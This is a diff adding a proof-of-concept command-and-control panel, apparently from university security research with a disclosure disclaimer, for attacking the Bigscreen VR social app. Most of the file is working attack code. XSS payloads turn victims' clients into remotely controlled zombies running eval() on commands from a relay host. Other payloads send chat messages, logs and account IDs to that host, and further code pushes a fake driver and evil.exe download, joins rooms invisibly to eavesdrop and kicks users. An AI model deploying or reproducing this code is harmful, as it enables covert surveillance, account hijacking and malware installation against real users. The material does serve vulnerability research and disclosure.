@@ -1,0 +1,2210 @@
+<!--
+Man-in-the-Room Attack and Command & Control Server Proof of Concept — Bigscreen
+
+Vondracek Martin mvondracek vondracek.mar@gmail.com
+
+Security and Forensics of Immersive Virtual Reality Social Applications
+Cyber Forensics Research & Education Group                 https://www.unhcfreg.com/
+Tagliatela College of Engineering                          https://www.newhaven.edu/engineering/
+University of New Haven                                    https://www.newhaven.edu
+300 Boston Post Rd, West Haven, CT 06516
+
+DISCLAIMER: This software is a part of the cyber forensic research carried out by the research group UNHcFREG @ TCoE
+at the University of New Haven, CT, USA. This software was developed as a proof of concept Man-in-the-Room attack.
+Details concerning the research were kept private, the software vendor (Bigscreen, Inc.) was then contacted during
+responsible disclosure. No harm has been done to the official infrastructure and users. Authors assume no liability
+and are not responsible for any misuse or damage caused by this software. This software is intended as a proof
+of concept only. The end user of this software agrees to use this software for education and research purposes only.
+
+ -->
+<!doctype html>
+<html lang="en">
+  <head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="./css/bootstrap.min.css">
+    <link rel="stylesheet" href="./css/main.css">
+
+    <title>MitR and C&amp;C PoC — Bigscreen</title>
+</head>
+<body>
+<nav class="navbar navbar-expand-lg navbar-dark bg-dark">
+    <a class="navbar-brand" href="#">Man-in-the-Room Attack</a>
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+    </button>
+
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <ul class="navbar-nav mr-auto">
+            <li class="nav-item active">
+                <a class="nav-link" href="#">Command &amp; control panel <span class="sr-only">(current)</span></a>
+            </li>
+            <li class="nav-item"><span class="navbar-text">|</span></li>
+            <li class="nav-item">
+                <a class="nav-link" data-toggle="modal" data-target="#attacksModal" href="#">Overview of attacks</a>
+            </li>
+            <li class="nav-item"><span class="navbar-text">|</span></li>
+            <li class="nav-item">
+                <a class="nav-link" data-toggle="modal" data-target="#limitationsModal" href="#">Limitations of current implementation</a>
+            </li>
+            <li class="nav-item"><span class="navbar-text">|</span></li>
+            <li class="nav-item">
+                <a class="nav-link" data-toggle="modal" data-target="#disclaimerModal" href="#">Disclaimer</a>
+            </li>
+        </ul>
+    </div>
+</nav>
+
+<div class="modal fade" id="attacksModal" tabindex="-1">
+    <div class="modal-dialog modal-dialog-centered modal-lg">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h5 class="modal-title">Overview of attacks</h5>
+                <button type="button" class="close" data-dismiss="modal">
+                    <span>&times;</span>
+                </button>
+            </div>
+            <div class="modal-body">
+                <ul>
+                    <li><b class="text-danger">Botnet-like group</b> of infected Bigscreen applications that can be controlled by this <b>command &amp; control</b> panel.</li>
+                    <li>Force <b>download and execution</b> any payload (virus, malware, etc.) to victim's computer. <b class="text-danger">RCE</b></li>
+                    <li>Run program on victim's machine.</li>
+                    <li>Remote <abbr title="Read–Eval–Print Loop" class="initialism">REPL</abbr> (remote Javascript <code>eval</code>) on victim's machines.<b class="text-danger">JS RCE</b></li>
+                    <li><b>Invisibly join</b> any known Bigscreen room. Attacker is not visible in VR. Attacker's username is hidden from <i>Room Preview UI</i> and from <i>Room Participants UI</i>.</li>
+                    <li><b>Receive victim's audio and video</b> without victim's knowledge. <b class="text-danger">Eavesdropping</b></li>
+                    <li>Persistently <b>eavesdrop victim's chat</b>, even if they go to another room.</li>
+                    <li>Ask user to download required fake driver. <b class="text-danger">Phishing, RCE</b></li>
+                    <li>Remotely <b>kill</b> victim's Bigscreen application. <b class="text-danger">Denial-of-service</b></li>
+                    <li>Force victim to send any chat message.</li>
+                    <li>Ban selected user until restart. <b class="text-danger">Denial-of-service</b> </li>
+                    <li><b>Kick</b> user from room. <i>Only admin should be able to do this.</i> <b class="text-danger">Denial-of-service</b></li>
+                    <li>Set selected user as admin. <b class="text-danger">Privilege escalation</b></li>
+                    <li>Change room's settings VR locks. <i>Only admin should be able to do this.</i></li>
+                    <li>Redirect Bigscreen's <abbr title="User Interface" class="initialism">UI</abbr> to any webpage. <b class="text-danger">Phishing</b></li>
+                    <li>Gather all victim's <b>logs</b>.</li>
+                    <li>Force victim to open screenshot directory.</li>
+                    <li>Change user's avatar.</li>
+                    <li>Play various sound effects.</li>
+                </ul>
+            </div>
+            <div class="modal-footer">
+                <button type="button" class="btn btn-primary" data-dismiss="modal">Close</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="modal fade" id="limitationsModal" tabindex="-1">
+    <div class="modal-dialog modal-dialog-centered modal-lg">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h5 class="modal-title">Limitations of current implementation</h5>
+                <button type="button" class="close" data-dismiss="modal">
+                    <span>&times;</span>
+                </button>
+            </div>
+            <div class="modal-body">
+                <ul>
+                    <li>
+                        Peer connection intended for multimedia transport currently does not support fallback to TURN servers.
+                        Support for STUN servers was sufficient for this proof of concept.
+                        With support for STUN servers, we were able to connect with users across Internet without complications.
+                    </li>
+                    <li>
+                        Peer connection establishment is currently supported only with participants who are already in the room.
+                        This command &amp; control panel does not initiate the connection but accepts incoming connections.
+                        This was sufficient for this proof of concept
+                    </li>
+                    <li>
+                        Command &amp; control panel currently does not support reconnecting to zombies after page refresh.
+                        Please restart relay server if you refresh this page.
+                    </li>
+                </ul>
+            </div>
+            <div class="modal-footer">
+                <button type="button" class="btn btn-primary" data-dismiss="modal">Close</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="modal fade" id="disclaimerModal" tabindex="-1">
+    <div class="modal-dialog modal-dialog-centered modal-lg">
+        <div class="modal-content bg-danger text-white">
+            <div class="modal-header">
+                <h5 class="modal-title">Disclaimer</h5>
+            </div>
+            <div class="modal-body">
+                <p class="text-justify">This software is a part of the cyber forensic research carried out by the research group
+                    UNHcFREG&nbsp;@&nbsp;TCoE at the University of New Haven, CT, USA. This software was developed
+                    as a proof of concept Man-in-the-Room attack. Details concerning the research were kept private,
+                    the software vendor (Bigscreen, Inc.) was then contacted during responsible disclosure. No harm has been done
+                    to the official infrastructure and users. Authors assume no liability and are not responsible for
+                    any misuse or damage caused by this software. This software is intended as a proof of concept only.
+                </p>
+                <p class="text-justify font-weight-bold">
+                    The end user of this software agrees to use this software for education and research purposes only.
+                </p>
+
+            </div>
+            <div class="modal-footer">
+                <button type="button" class="btn btn-secondary" data-dismiss="modal">Accept</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="container-fluid">
+    <div class="row">
+        <div class="col-12">
+            <h1>Man-in-the-Room Attack <small class="text-muted">Proof of Concept</small></h1>
+            <h2>Command &amp; control panel: Bigscreen <small class="text-muted"><a href="https://bigscreenvr.com/">https://bigscreenvr.com/</a></small></h2>
+        </div>
+        <div class="col-6">
+            <form class="form-inline justify-content-center" id="infectLobbyForm">
+                <div class="form-group">
+                    <label for="targetUser" class="my-2">Target user: </label>
+                    <input class="form-control m-2" name="targetUser" id="targetUser" value="Bob" type="text" placeholder="Bob" disabled>
+                </div>
+                <div class="form-group form-check">
+                    <input class="form-check-input my-2 ml-3" type="checkbox" value="" id="worm" disabled >
+                    <label class="form-check-label m-2" for="worm">Worm</label>
+                </div>
+                <input class="btn btn-danger m-2" type="submit" value="Start poisoning lobby">
+            </form>
+        </div>
+        <div class="col-6">
+            <form class="form-inline justify-content-center" id="joinRoomForm">
+                <label class="m-2" for="roomIdInput">Room ID: </label>
+                <input class="m-2 form-control" name="roomId" id="roomIdInput" type="text" placeholder="room-8we1jdc4" required>
+                <input class="btn btn-primary m-2" type="submit" value="Eavesdrop as invisible user">
+            </form>
+        </div>
+    </div>
+    <div class="row"><div class="col-sm">
+        <div class="card"><div class="card-body">
+            <div class="card-deck">
+                <div class="card text-center" id="publicRooms">
+                    <div class="card-header">Public rooms</div>
+                    <ul class="list-group list-group-flush roomList"></ul>
+                    <div class="card-footer text-muted roomList-footer">
+                       <div class="form-check">
+                            <input class="form-check-input" type="checkbox" value="" id="publicRoomsAutorefresh">
+                            <label class="form-check-label" for="publicRoomsAutorefresh">autorefresh</label>
+                        </div>
+                        last update <time></time>
+                    </div>
+                </div>
+                <div class="card text-center" id="discoveredRooms">
+                    <div class="card-header">Discovered rooms</div>
+                    <ul class="list-group list-group-flush roomList"></ul>
+                    <div class="card-footer text-muted roomList-footer">
+                       <div class="form-check">
+                            <input class="form-check-input" type="checkbox" value="" id="discoveredRoomsAutorefresh">
+                            <label class="form-check-label" for="discoveredRoomsAutorefresh">autorefresh</label>
+                        </div>
+                        last update <time></time>
+                    </div>
+                </div>
+                <div class="card text-center" id="zombies">
+                    <div class="card-header">Zombies</div>
+                    <div class="list-group list-group-flush zombieList"></div>
+                    <div class="card-footer text-muted zombieList-footer">
+                       <div class="form-check">
+                            <input class="form-check-input" type="checkbox" value="" id="zombiesAutorefresh">
+                            <label class="form-check-label" for="zombiesAutorefresh">autorefresh</label>
+                        </div>
+                        last update <time></time>
+                    </div>
+                </div>
+            </div>
+        </div></div>
+    </div></div>
+
+    <div class="row" id="zombieControls"></div>
+
+
+
+
+<div id="rooms"></div>
+
+
+</div>
+<!-- Optional JavaScript -->
+<!-- jQuery first, then Popper.js, then Bootstrap JS -->
+<script src="./js/jquery-3.3.1.slim.min.js"></script>
+<script src="./js/popper.min.js"></script>
+<script src="./js/bootstrap.min.js"></script>
+<script src="./js/adapter-latest.js"></script>
+<script src="./js/msgpack.min.js"></script>
+<script>
+'use strict';
+
+/**
+ * Man-in-the-Room Attack and Command & Control Server Proof of Concept — Bigscreen
+ *
+ * Vondracek Martin mvondracek vondracek.mar@gmail.com
+ *
+ * Security and Forensics of Immersive Virtual Reality Social Applications
+ * Cyber Forensics Research & Education Group                 https://www.unhcfreg.com/
+ * Tagliatela College of Engineering                          https://www.newhaven.edu/engineering/
+ * University of New Haven                                    https://www.newhaven.edu
+ * 300 Boston Post Rd, West Haven, CT 06516
+ *
+ * DISCLAIMER: This software is a part of the cyber forensic research carried out by the research group UNHcFREG @ TCoE
+ * at the University of New Haven, CT, USA. This software was developed as a proof of concept Man-in-the-Room attack.
+ * Details concerning the research were kept private, the software vendor (Bigscreen, Inc.) was then contacted during
+ * responsible disclosure. No harm has been done to the official infrastructure and users. Authors assume no liability
+ * and are not responsible for any misuse or damage caused by this software. This software is intended as a proof
+ * of concept only. The end user of this software agrees to use this software for education and research purposes only.
+ */
+
+
+//region Configuration
+
+/** URL of WebSocket server which relays communication between Command & control panel and zombies. */
+const relayWebSocketServerUrl = 'ws://172.26.103.128:8081';
+/** URL of static web server which hosts this Command & control panel */
+const webServerUrl = 'http://172.26.103.128:8080/';
+const fakeDriverUrl = webServerUrl + 'payloads/VR_driver_0.34.0.exe';
+const evilPayloadUrl = webServerUrl + 'payloads/evil.exe';
+
+const bigscreenSignalUrl = 'wss://signal2.bigscreenvr.com';
+const unityVersion = '0.34.0';
+const textName = '__Trudy__';
+const offerOptions = {
+  offerToReceiveAudio: 1,
+  offerToReceiveVideo: 1
+};
+const webRtcConfig = {
+  'iceServers': [
+    {
+      'urls': 'stun:stun.l.google.com:19302'
+    }
+  ]
+};
+
+//endregion
+
+// region GUI bindings
+const joinRoomForm = document.getElementById('joinRoomForm');
+const infectLobbyForm = document.getElementById('infectLobbyForm');
+const roomsElement = document.getElementById('rooms');
+const roomIdInput = document.getElementById('roomIdInput');
+//endregion
+
+//region XSS payloads
+let hideUsernameFromRoomPreview = `Array.prototype.forEach.call(document.getElementById('room-card-players').childNodes,function(e,i,a){if(e.nodeName==='#text' && e.data==='${textName}'){if(i!==0){a[i-1].remove();}e.remove();}});`;
+let hideFirstCommaFromRoomPreview = "setTimeout(function(){var n=document.getElementById('room-card-players').childNodes;if(n[0]&&n[1]&&n[0].nodeName==='SCRIPT'&&n[1].nodeName==='#text'&& n[1].data===', '){n[1].remove()}},1);";
+let hideUsernameFromRoomParticipants = `Array.prototype.forEach.call(document.querySelectorAll('#room-participants li'),function(e){if(e.querySelector('h3.user-name').firstChild.nodeValue==='${textName}'){e.remove()}});`;
+let persistentChatEavesdropping = `;sendChat=function(){var s=new WebSocket('${relayWebSocketServerUrl}');s.onopen=function(){s.send(JSON.stringify({'type':'chat','roomId':roomState.roomId,'name':NAME,uuid:ACCOUNT.uuid,'steamId':mySteamId,'oculusId':myOculusId,'message':$('#room-chat-input').val()}));if(canSendChatMessage){canSendChatMessage= false;var _0x1865xb7=$(_0x6af9[1362])[_0x6af9[743]]();if(_0x1865xb7!= _0x6af9[90]){$(_0x6af9[1362])[_0x6af9[743]](_0x6af9[90]);$(_0x6af9[1362])[_0x6af9[1359]]();displayChatMessage(_0x1865xb7,USER);Unity[_0x6af9[1072]](_0x6af9[1971],[_0x1865xb7],USER,_0x6af9[1972]);gaChatMessageSentEvent()};setTimeout(function(){canSendChatMessage= true},CHATRATELIMIT)};};};`;
+let makeZombie = `if(!window.sz || window.sz.readyState==3){window.sz=new WebSocket('${relayWebSocketServerUrl}');sz.onopen=function(){sz.send(JSON.stringify({'type':'zombie-register','steamId':mySteamId,'oculusId':myOculusId,'uuid':ACCOUNT.uuid,name:NAME}))};sz.onmessage=function(e){var m=JSON.parse(e.data);if(m.type==='zombie-cmd'){sz.send(JSON.stringify({type:'zombie-result','steamId':mySteamId,'oculusId':myOculusId,'uuid':ACCOUNT.uuid,result:eval(m.cmd)}));}else if(m.type==='zombie-ping'){sz.send(JSON.stringify({type:'zombie-pong',uuid:ACCOUNT.uuid,}));}};};`;
+let discoverRoom = `joinRoomWithId = function(roomId) {var srd=new WebSocket('${relayWebSocketServerUrl}');srd.onopen=function(){srd.send(JSON.stringify({'type':'room-discovered','roomId':roomId,})); checkMyUserCreatedRoom(); signal["write"]({ 'type': "room-join", 'roomId': roomId, 'name': NAME, 'uuid': ACCOUNT["uuid"], 'version': UNITYVERSION, 'steamId': mySteamId, 'oculusId': myOculusId }); srd.close(); };};`;
+let persistentLogsEavesdropping = `var nl = function(level, args){var sl=new WebSocket('${relayWebSocketServerUrl}');sl.onopen=function(){sl.send(JSON.stringify({type:'log',uuid:ACCOUNT.uuid,level:level,message:args}));sl.close();};}; console.log=function(){nl('console.log',arguments)};Unity.log=function(){nl('Unity.log',arguments)};Unity.logError=function(){nl('Unity.logError',arguments)};`;
+//endregion
+
+let rooms = {};
+let roomRepls = {};
+let dataChannelSend, dataChannelReceive;
+
+function generateBigscreenUuid() {
+  function bigscreenRand() {
+    return Math["floor"]((1 + Math["random"]()) * 65536).toString(16) ["substring"](1)
+  }
+  return bigscreenRand() + bigscreenRand() + "-" + bigscreenRand() + "-" + bigscreenRand() + "-" + bigscreenRand() + "-" + bigscreenRand() + bigscreenRand() + bigscreenRand()
+}
+
+// TODO: Handle payload on different places. Was not required yet.
+function removePayloadFromName(name){
+    return (name.includes('<')?name.substring(0,name.indexOf('<')):name);
+}
+
+var messageRelayWs = new WebSocket(relayWebSocketServerUrl);
+messageRelayWs.onopen = function(){
+    messageRelayWs.send(JSON.stringify({type:'control-panel-connect'}));
+};
+messageRelayWs.onmessage = function(event){
+    let message = JSON.parse(event.data);
+    console.log("messageRelayWs received:", message);
+    switch (message.type) {
+        case 'chat': {
+            let date = new Date();
+            if (rooms[message.roomId]) {
+                rooms[message.roomId].roomUI.renderChatMessage(message.message, message.name, date);
+            }
+            if (zombiesManager.zombies[message.uuid]) {
+                zombiesManager.zombies[message.uuid].zombieControlUI.renderChatMessage(message.message, message.roomId, date);
+            }
+            break;
+        }
+        case 'log': {
+            if (zombiesManager.zombies[message.uuid]) {
+                zombiesManager.zombies[message.uuid].zombieControlUI.renderLogMessage(message.level, message.message);
+            }
+            break;
+        }
+        case 'room-discovered':
+            discoveredRoomsManager.addRoom(message.roomId);
+            break;
+        case 'zombie-register': {
+            console.log('New zombie:', message.uuid);
+            zombiesManager.addZombie(message.uuid, message.steamId, message.oculusId, message.name);
+
+            let roomRepl = roomRepls[message.uuid];
+            zombiesManager.zombies[message.uuid].repls.push(roomRepl);
+            zombiesManager.zombies[message.uuid].repls.forEach(function(repl) {
+                repl.formElement.addEventListener("submit", function (event) {
+                    event.preventDefault();
+                    let cmd = repl.inputElement.value;
+                    repl.inputElement.value = '';
+                    // render cmd in all repls associated with this zombie (in zombie control and in room)
+                    zombiesManager.zombies[message.uuid].repls.forEach(
+                        function(repl) {repl.renderCmd(cmd);}
+                    );
+                    sendZombieCmd(message.uuid, cmd);
+                });
+            });
+            break;
+        }
+        case 'zombie-result': {
+            console.log('Zombie :', message.uuid, 'Result:', message.result);
+            zombiesManager.zombies[message.uuid].repls.forEach(function(repl){
+                repl.renderResult(message.result);
+            });
+
+            break;
+        }
+        case 'zombie-pong': {
+            zombiesManager.receivedPong(message.uuid);
+            break;
+        }
+        default:
+            console.warn('messageRelayWs unexpected message');
+    }
+};
+
+function sendZombieCmd(zombieUuid, cmd){
+    console.debug('sendZombieCmd', zombieUuid, cmd);
+    messageRelayWs.send(JSON.stringify({
+        type: "zombie-cmd",
+        uuid: zombieUuid,
+        cmd: cmd
+    }));
+}
+
+function LobbyPoisoner(roomName, attackerIdentity, onStarted, onStopped){
+    // TODO: infectLobbyForm form fields `worm` and `targetUser` are currently ignored, worm=false, targetUser='Bob'
+    let that = this;
+    this.signalingWs = null;
+    this.onStarted = onStarted;
+    this.onStopped = onStopped;
+    this.state = 'new';
+
+    this.roomId = null;
+    this.roomName = roomName;
+    this.roomDescription = 'Just my own room.';
+    this.attackerIdentity = attackerIdentity;
+
+    this.start = function(){
+        this.state = 'starting';
+        this.createPublicRoom();
+    };
+    this.stop = function(){
+        this.leaveRoom();
+        this.state = 'stopped';
+        this.onStopped();
+        console.info('LobbyPoisoner: Stopped infecting lobby.');
+    };
+
+    this.createPublicRoom = function(){
+        this.signalingWs = new WebSocket(bigscreenSignalUrl);
+        this.signalingWs.binaryType = 'arraybuffer';
+        this.signalingWs.onopen = function (event) {
+            console.debug('LobbyPoisoner connected', event);
+            that.sendSignalingMessage({type: 'register-desktop'});
+            console.debug('LobbyPoisoner registered');
+
+            that.sendSignalingMessage({
+                'type': "room-create",
+                'name': that.roomName,
+                'description': that.roomDescription,
+                'isPrivate': false,
+                'category': "Chat",
+                'creatorName': that.attackerIdentity.name,
+                'creatorUuid': that.attackerIdentity.uuid,
+                'environment': "Cinema",
+                'version': "0.34.0",
+                'size': 12,
+                'roomType': "bigroom"
+              });
+            console.debug('LobbyPoisoner requested to create room');
+        };
+        this.signalingWs.onclose = function (event) {
+            console.debug('LobbyPoisoner onClose disconnected', event);
+        };
+        this.signalingWs.onmessage = function (event) {
+            that.onSignalingMessage(event);
+        };
+        this.signalingWs.onerror = function (event) {
+            console.error('LobbyPoisoner onError event', event);
+        };
+    };
+
+    this.sendSignalingMessage = function(message) {
+        console.debug('sendSignalingMessage', message);
+        this.signalingWs.send(msgpack.encode(message));
+    };
+
+    this.joinRoom = function(){
+        that.sendSignalingMessage({
+          'type': "room-join",
+          'roomId': that.roomId,
+          'name': that.attackerIdentity.name,
+          'uuid': that.attackerIdentity.uuid,
+          'version': unityVersion,
+          'steamId': that.attackerIdentity.steamId,
+          'oculusId': that.attackerIdentity.oculusId
+        });
+        console.debug('LobbyPoisoner requested to join room', that.roomId);
+    };
+
+    this.leaveRoom = function(){
+        this.state = 'leaving';
+        this.sendSignalingMessage({type: "room-leave"});
+        this.signalingWs.close();
+        this.signalingWs = null;
+    };
+
+    this.onSignalingMessage = function(event) {
+        let message = msgpack.decode(new Uint8Array(event.data));
+        console.debug('LobbyPoisoner.onSignalingMessage()', message);
+
+        switch (message.type) {
+            case "room-created":
+                this.roomId = message.roomId;
+                console.info('LobbyPoisoner: room created', this.roomId);
+                this.joinRoom();
+                break;
+
+            case "user-left":
+                console.debug(`LobbyPoisoner: Participant ${message.userId} left room ${this.roomId}.`);
+                break;
+
+            case "user-joined":
+                if(message.uuid === this.attackerIdentity.uuid){
+                    this.attackerIdentity.userId = message.userId;
+                    console.debug('LobbyPoisoner: set attackerIdentity.userId', this.attackerIdentity.userId);
+                    console.debug('LobbyPoisoner: user ready');
+
+                    this.sendSignalingMessage({
+                        type: "user-ready",
+                        roomId: this.roomId,
+                        userId: this.attackerIdentity.userId
+                    });
+
+                    this.state = 'started';
+                    this.onStarted();
+
+                    console.info('LobbyPoisoner: Started infecting lobby.');
+                }
+                else{
+                    console.debug(`LobbyPoisoner: Participant ${message.userId} joined room ${this.roomId}.`);
+                }
+                break;
+
+            case "admin":
+            case "room-latest":
+            case "linkedpc-joined":
+            case "linkedpc-left":
+            case "party-join":
+            case "user-ready":
+            case "room-join-fail":
+            case "room-environment":
+            case "room-private":
+            case "room-public":
+            case "events":
+            case "server-time":
+            case 'ice':
+            case 'offer':
+            case 'answer':
+                console.debug('received message ignored', message);
+                break;
+
+            default:
+                console.error('Unexpected message type (server to client):', message);
+                break;
+        }
+    };
+
+}
+
+/**
+ * Room with connection to signalling server and participants.
+ */
+function Room(roomId, attackerIdentity){
+    this.attackerIdentity = attackerIdentity;
+
+    this.roomId = roomId;
+    this.name = null;
+    this.description = null;
+    this.private = null;
+    this.size = null;
+    this.createdName = null;
+    this.createdTime = null;
+    this.roomType = null;
+    this.category = null;
+    this.environment = null;
+    this.version = null;
+
+    this.locks = null;
+
+    this.lastUpdated = null;
+
+    this.signalingWs = null;
+
+    this.roomUI = null;
+    this.roomParticipants = {};
+
+    //region Init roomParticipants
+    /*
+     * TODO: Change app's logic so that we could periodically update room state and participants without losing
+     * connections.
+     * TODO: We currently do not support dealing with users leaving and joining room. We only support connection to
+     * users who are already in the room when we join.
+     */
+    this._initRoomParticipants = function(onSuccess, onError){
+        let that = this;
+        let xhr = new XMLHttpRequest();
+        xhr.overrideMimeType("application/json");
+        xhr.onload = function () {
+            let roomState = JSON.parse(xhr.responseText);
+            let users = [];
+            for(let key in roomState){
+                if(roomState.hasOwnProperty(key) && (key.split('.')[0].substr(0,4) === 'user' )) {
+                    let user = key.split('.')[0];
+                    if(!users.includes(user)){users.push(user);}
+                }
+            }
+            for (let i = 0; i < users.length; i++) {
+                let userId = users[i];
+                let identity = new Identity(
+                    roomState[userId + '.name'],
+                    roomState[userId + '.uuid'],
+                    roomState[userId + '.steam'] ? roomState[userId + '.steam'] : ''
+                );
+                that.roomParticipants[userId] = new RoomParticipant(identity, that, userId);
+            }
+            onSuccess();
+        };
+        xhr.onerror = function () {
+            console.error('ERROR', 'Room.initRoomParticipants()', xhr, that);
+            onError();
+        };
+        xhr.open('GET', 'https://signal2adm.bigscreenvr.com/roomstate?roomId=' + this.roomId, true);
+        xhr.send();
+    };
+    //endregion
+
+    //region Load room information
+    this._loadRoomInformation = function(onSuccess, onError){
+        let that = this;
+        let xhr = new XMLHttpRequest();
+        xhr.overrideMimeType("application/json");
+        xhr.onload = function () {
+            let roomState = JSON.parse(xhr.responseText);
+
+            that.name = roomState.name;
+            that.description = roomState.description;
+            that.private = roomState.private;
+            that.size = roomState.size;
+            that.createdName = roomState['created.name'];
+            that.createdTime = roomState['created.time'];
+            that.roomType = roomState.roomType;
+            that.category = roomState.category;
+            that.environment = roomState.environment;
+            that.version = roomState.version;
+
+            that.lastUpdated = new Date();
+            onSuccess();
+        };
+        xhr.onerror = function () {
+            console.error('ERROR', 'Room.update()', xhr, that);
+            onError();
+        };
+        xhr.open('GET', 'https://signal2adm.bigscreenvr.com/roomstate?roomId=' + this.roomId, true);
+        xhr.send();
+    };
+    //endregion
+
+    /**
+     * ASYNC Load room information from server.
+     * Set room's data and create child objects based on retrieved infromation.
+     */
+    this._load = function(onSuccess, onError){
+        let that = this;
+        this._initRoomParticipants(
+            function(){that._loadRoomInformation(onSuccess, onError);},
+            onError
+        );
+    };
+
+    this.sendSignalingMessage = function(message) {
+        console.log('sendSignalingMessage', message);
+        this.signalingWs.send(msgpack.encode(message));
+    };
+
+    this.kickParticipant = function(userId){
+        this.sendSignalingMessage({
+            type: "admin",
+            action: "kick",
+            roomId: this.roomId,
+            targetUser: userId
+        });
+    };
+
+    this.updateLockSettings = function(locks){
+        this.roomUI.updateLockSettings(locks);
+
+        this.sendSignalingMessage({
+          type: 'admin',
+          action: 'lock',
+          roomId: this.roomId,
+          msg: [
+            (locks.lockBigscreen ? '' : 'un') + 'lock-bigscreen',
+            (locks.lockDesktopAudio ? '' : 'un') + 'lock-desktopaudio',
+            (locks.lockDrawing ? '' : 'un') + 'lock-drawing',
+            (locks.lockMicrophones ? '' : 'un') + 'lock-microphones'
+          ]
+        });
+    };
+
+    /**
+     * Join room. Connect to signaling server and establish WebRTC channels
+     * with other room participants.
+     */
+    this.join = function(){
+        let that = this;
+        this.signalingWs = new WebSocket(bigscreenSignalUrl);
+        this.signalingWs.binaryType = 'arraybuffer';
+        this.signalingWs.onopen = function (event) {
+            console.log('connected', event);
+
+            let roomUI = new RoomUI(roomId, that);
+            roomUI.render(roomsElement);
+            that.roomUI = roomUI;
+            for (let userId in that.roomParticipants){
+                if(that.roomParticipants.hasOwnProperty(userId)){
+                    that.roomParticipants[userId].render();
+                }
+            }
+
+            that.sendSignalingMessage({type: 'register-desktop'});
+            console.log('registered');
+
+            that.sendSignalingMessage({
+                'type': "room-join",
+                'roomId': that.roomId,
+                'name': that.attackerIdentity.name,
+                'uuid': that.attackerIdentity.uuid,
+                'version': unityVersion,
+                'steamId': that.attackerIdentity.steamId,
+                'oculusId': that.attackerIdentity.oculusId
+            });
+        };
+        this.signalingWs.onclose = function (event) {
+            console.log('onClose disconnected', event);
+        };
+        this.signalingWs.onmessage = function (event) {
+            that.onSignalingMessage(event);
+        };
+        this.signalingWs.onerror = function (event) {
+            console.log('onError event', event);
+        };
+    };
+
+    this.leave = function(){
+        for (let userId in this.roomParticipants){
+            if(this.roomParticipants.hasOwnProperty(userId)){
+                this.roomParticipants[userId].hide();
+                this.roomParticipants[userId].closeConnections();
+                delete this.roomParticipants[userId];
+            }
+        }
+        this.roomUI.hide();
+        this.sendSignalingMessage({type: "room-leave"});
+        this.signalingWs.close();
+        this.signalingWs = null;
+    };
+
+    this.onSignalingMessage = function(event) {
+        let message = msgpack.decode(new Uint8Array(event.data));
+        console.log('Room.onSignalingMessage()', message);
+
+        switch (message.type) {
+            case "user-left":{
+                this.roomParticipants[message.userId].hide();
+                this.roomParticipants[message.userId].closeConnections();
+                delete this.roomParticipants[message.userId];
+                console.log(`Participant ${message.userId} left room ${this.roomId}.`);
+                break;
+            }
+            case "admin": {
+                if(message.action === 'lock'){
+                    this.locks = {
+                        lockBigscreen: message.msg.includes('lock-bigscreen'),
+                        lockDesktopAudio: message.msg.includes('lock-desktopaudio'),
+                        lockDrawing: message.msg.includes('lock-drawing'),
+                        lockMicrophones: message.msg.includes('lock-microphones'),
+                    };
+                    this.roomUI.updateLockSettings(this.locks);
+                    console.log('updated locks', this.locks);
+                }
+                else{
+                    console.error('unexpected action of message', message);
+                }
+                break;
+            }
+            case "room-latest":
+            case "linkedpc-joined":
+            case "linkedpc-left":
+            case "party-join":
+            case "user-ready":
+            case "room-join-fail":
+            case "room-created":
+            case "room-environment":
+            case "room-private":
+            case "room-public":
+            case "events":
+            case "server-time":
+                console.log('received message ignored', message);
+                break;
+
+            case "user-joined":
+                if(message.uuid === this.attackerIdentity.uuid){
+                    this.attackerIdentity.userId = message.userId;
+                    console.log('set attackerIdentity.userId', this.attackerIdentity.userId);
+                    console.log('user ready');
+
+                    this.sendSignalingMessage({
+                        type: "user-ready",
+                        roomId: this.roomId,
+                        userId: this.attackerIdentity.userId
+                    });
+                }
+                break;
+
+            case 'ice':
+                console.log('onMessage received ICE');
+                console.assert(message.fromDevice === 'desktop', message.fromDevice);
+
+                const candidateStartPos = message.value.indexOf('candidate:');
+                let beforeCandidate  = message.value.slice(0,candidateStartPos);
+                let sdpMLineIndex = beforeCandidate.slice(0, beforeCandidate.indexOf('bigscreen_sdp_mline_index'));
+                let sdpMid = beforeCandidate.slice(
+                    beforeCandidate.indexOf('bigscreen_sdp_mline_index') + 'bigscreen_sdp_mline_index'.length,
+                    beforeCandidate.indexOf('bigscreen_sdp_mid'));
+                let candidate = new RTCIceCandidate({
+                    sdpMid: sdpMid,
+                    sdpMLineIndex: sdpMLineIndex,
+                    candidate: message.value.slice(candidateStartPos)
+                });
+                {
+                    if( ! this.roomParticipants[message.fromUser]){
+                        console.error('ERROR', 'RoomParticipant object does not exist for sender of this received WebRTC ICE.');
+                        return;
+                    }
+                    if( ! this.roomParticipants[message.fromUser].connections[message.PCID]){
+                        console.error('ERROR', 'Connection object was not found in connections of sender of this received WebRTC ICE.');
+                        return;
+                    }
+                    let connection = this.roomParticipants[message.fromUser].connections[message.PCID];
+                    console.log('ice conn', connection);
+                    connection.rtcPeerConnection.addIceCandidate(candidate);
+                }
+                break;
+            case 'offer':
+                console.log('onMessage received OFFER');
+                console.assert(message.fromDevice === 'desktop', message.fromDevice);
+
+                {
+                    let roomParticipant = this.roomParticipants[message.fromUser];
+                    if( ! roomParticipant){
+                        console.error('ERROR', 'RoomParticipant object does not exist for sender of this received WebRTC SDP Offer.');
+                        return;
+                    }
+                    let connection = new Connection(message.SCID, message.PCID, roomParticipant);
+                    roomParticipant.connections[message.PCID] = connection;
+
+                    if (!connection.isInitiator && !connection.isStarted) {
+                        connection.maybeStart();
+                    }
+                    connection.rtcPeerConnection.setRemoteDescription(new RTCSessionDescription(
+                        {type: message.type, sdp: message.value, SCID: connection.scid, pcid: connection.pcid}));
+                    connection.doAnswer();
+                }
+                break;
+            case 'answer':
+                console.error('onMessage received ANSWER');
+
+                console.assert(message.roomId === this.roomId, message.roomId, this.roomId);
